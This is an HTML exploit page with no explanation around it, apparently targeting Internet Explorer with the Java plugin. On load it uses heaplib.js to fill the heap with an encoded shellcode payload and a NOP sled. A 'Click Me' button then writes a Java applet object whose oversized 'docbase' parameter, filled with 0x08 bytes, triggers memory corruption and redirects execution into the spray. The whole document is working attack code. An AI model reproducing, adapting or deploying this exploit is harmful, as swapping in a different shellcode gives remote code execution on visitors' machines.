<html>
<head>
   <link rel="shortcut icon" href="http://127.0.0.1:9999/x.ico" />
   <script src="heaplib.js"></script>

   <script>
   function packv(n) {
      var s = new Number(n).toString(16);
      while(s.length < 8) s = "0" + s;
      return(unescape("%u" + s.substring(4,8) + "%u" + s.substring(0,4)));
   }

   function spray_heap() {
      heap = new heapLib.ie(0x20000);

      var payload, block1, nopsled1; //if it is 314bytes + 2 = 316 bytes 4 bytes alignments. calc.exe 200 bytes
    
      payload =unescape("%ue089%ud3db%u70d9%u5bf4%u5953%u4949%u4949%u4949%u4949%u4949%u4343%u4343%u4343%u5137%u6a5a%u5841%u3050%u3041%u6b41%u4141%u3251%u4241%u4232%u3042%u4242%u4241%u5058%u4138%u7542%u494a%u6c69%u7849%u526d%u3033%u5045%u7047%u3045%u496c%u556b%u7154%u5059%u4432%u6b6e%u3046%u7034%u4b4c%u4231%u4c74%u4b4c%u4251%u6467%u4b6c%u3234%u6864%u6f66%u3758%u5a71%u7675%u5156%u4f4b%u6c4c%u6c55%u6150%u4c53%u3253%u6c34%u5057%u615a%u4f78%u6d66%u7147%u5749%u426a%u527a%u5250%u3746%u6b6e%u5250%u7036%u6b6e%u5a51%u6c45%u6b6e%u6c52%u5164%u4843%u6338%u5851%u7157%u314e%u6163%u6b4e%u4931%u3071%u6146%u737a%u4b4c%u3967%u7876%u7379%u5a56%u5931%u4b6c%u5456%u6b4e%u6156%u765a%u7134%u4f6b%u6c6c%u5149%u6f4a%u6d66%u6146%u4738%u4847%u7079%u3564%u7648%u5335%u6d61%u386c%u4b47%u4d63%u7455%u6571%u7479%u6863%u6b4e%u3846%u6454%u7157%u334e%u6630%u6b4e%u6c46%u4b50%u4b4c%u5830%u6c37%u5135%u736a%u6b4e%u7467%u4b6c%u7137%u304e%u594d%u6452%u4456%u5447%u4b61%u6b53%u7171%u7942%u4a51%u7142%u6f79%u7049%u6f53%u6f33%u4a51%u6b4e%u3272%u4b5a%u4d4c%u6d73%u4842%u6335%u7244%u3033%u3073%u5873%u4743%u6361%u4247%u6f63%u3446%u5873%u4c50%u3764%u3661%u5775%u6f79%u4549%u3838%u306a%u6166%u5045%u7047%u4956%u4468%u6433%u7042%u7871%u4956%u304b%u6b50%u7067%u6f39%u4549%u3076%u7052%u7042%u7032%u3037%u3076%u3047%u7072%u4872%u4a4a%u4f64%u4f69%u504b%u4f6b%u4559%u474d%u7a51%u4554%u3875%u4f33%u7037%u7057%u3173%u4842%u7277%u3073%u5367%u3661%u494c%u467a%u5a63%u3032%u3676%u3746%u5853%u394a%u556f%u5462%u6130%u6f59%u5558%u354b%u5049%u4463%u6c56%u4f6b%u4e50%u7877%u6561%u4c5a%u3835%u505a%u454f%u724d%u3676%u6f79%u4569%u4862%u5363%u4d32%u6470%u5075%u694e%u6348%u4771%u7732%u6743%u5136%u464b%u6a50%u6267%u7972%u6643%u426a%u6d79%u3675%u5749%u7443%u6454%u6c35%u3153%u6136%u4d4c%u3457%u5437%u3032%u364f%u7067%u6452%u3466%u7032%u4651%u3666%u6663%u7653%u5630%u6e62%u5650%u7662%u5330%u3656%u7831%u7970%u4c78%u4f47%u466c%u6f49%u756a%u394b%u7069%u4e70%u6653%u3657%u6f79%u5056%u3875%u3833%u474c%u4d45%u7051%u6f39%u654b%u6b6d%u304c%u3558%u3249%u3666%u4872%u464e%u356a%u4d6f%u4d4d%u6f49%u755a%u4c57%u4654%u4c33%u7a47%u506d%u4b4b%u304d%u3544%u4564%u6b4d%u3767%u4355%u6251%u4f72%u6a30%u5045%u4361%u6f59%u5568%u4141");
      while((payload.length * 2) % 4 != 0)
      payload += unescape("%90");

      block1 = unescape("%u9090%u9090");

      // build nopsled1
      nopsled1 = payload;
      while(nopsled1.length < 0x1000)
         nopsled1 += block1;

      var heapblock1 = nopsled1;

      while(heapblock1.length < 0x40000)
         heapblock1 += heapblock1;

      var trimmedblock1 = heapblock1.substring(2, 0x40000 - 0x21);

      // heap spray
      for(var i = 0 ; i < 800 ; i++)
         heap.alloc(trimmedblock1);
   }

   function trigger() {
      var buf = "";

      for(i = 0; i < 200; i++)
         buf += unescape("%08%08%08%08"); //change to anywhere you want (little-endian)

      var htmlTags =
         "<object type='application/x-java-applet'>" +
         "<param name='launchjnlp' value='1'>" +
         "<param name='docbase' value='" + buf + "'>" +
         "</object>";

      document.write(htmlTags);
   }
   </script>
</head>
<body onload="spray_heap()">
   <input type="button" value="Click Me" onclick="trigger()">
</body>
</html>

